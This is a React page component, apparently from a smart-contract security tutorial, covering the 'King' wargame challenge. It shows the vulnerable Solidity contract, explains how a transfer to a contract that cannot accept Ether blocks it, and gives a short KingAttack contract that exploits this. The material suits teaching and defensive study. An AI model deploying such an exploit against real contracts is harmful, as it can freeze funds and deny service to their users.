import { useState } from "react";
import { Light as SyntaxHighlighter } from "react-syntax-highlighter";
import { atomOneDark } from "react-syntax-highlighter/dist/esm/styles/hljs";
import { AiFillCopy, AiOutlineFileDone } from "react-icons/ai";
import TextDiv from "../../components/TextDiv";

const King = () => {
  const [copy, setCopy] = useState(false);
  const codeString = `
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.8.0;
  
  contract King {
  
    address king;
    uint public prize;
    address public owner;
  
    constructor() payable {
      owner = msg.sender;  
      king = msg.sender;
      prize = msg.value;
    }
  
    receive() external payable {
      require(msg.value >= prize || msg.sender == owner);
      payable(king).transfer(msg.value);
      king = msg.sender;
      prize = msg.value;
    }
  
    function _king() public view returns (address) {
      return king;
    }
  }
`;

  const solutionCode = `
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.6.0;
  
  contract KingAttack {
      function alwaysKing(address payable _to) public payable {
          (bool sent, ) = _to.call.value(msg.value)("");
          require(sent, "Failed to send value!");
      }
  }
`;

  return (
    <div>
      <h1 className="headerText">King</h1>
      <div className="content">
        <div className="highlighterHeader">
          <p className="smallText"> Example code</p>
          {copy ? (
            <button className="copyButton">
              <span>
                <AiOutlineFileDone />
              </span>
              Copied!
            </button>
          ) : (
            <button
              className="copyButton"
              onClick={() => {
                navigator.clipboard.writeText(codeString);
                setCopy(true);
                setTimeout(() => {
                  setCopy(false);
                }, 3000);
              }}
            >
              <span>
                <AiFillCopy />
              </span>
              Copy Code
            </button>
          )}
        </div>
        <SyntaxHighlighter
          language="solidity"
          style={atomOneDark}
          customStyle={{
            padding: "25px",
            borderRadius: "0.375rem",
          }}
          wrapLongLines={true}
        >
          {codeString}
        </SyntaxHighlighter>
      </div>
      <div className="textBox">
        <TextDiv
          title="Hack"
          text="The previous king is sent back msg.value using transfer. But what if this previous king was a contract and it didn't implement any receive or fallback? It won't be able to receive any value. 
          And because of this transfer throws error, execution will stopped."
        />
      </div>
      <SyntaxHighlighter
        language="solidity"
        style={atomOneDark}
        customStyle={{
          padding: "25px",
          borderRadius: "0.375rem",
        }}
        wrapLongLines={true}
      >
        {solutionCode}
      </SyntaxHighlighter>
    </div>
  );
};

export default King;
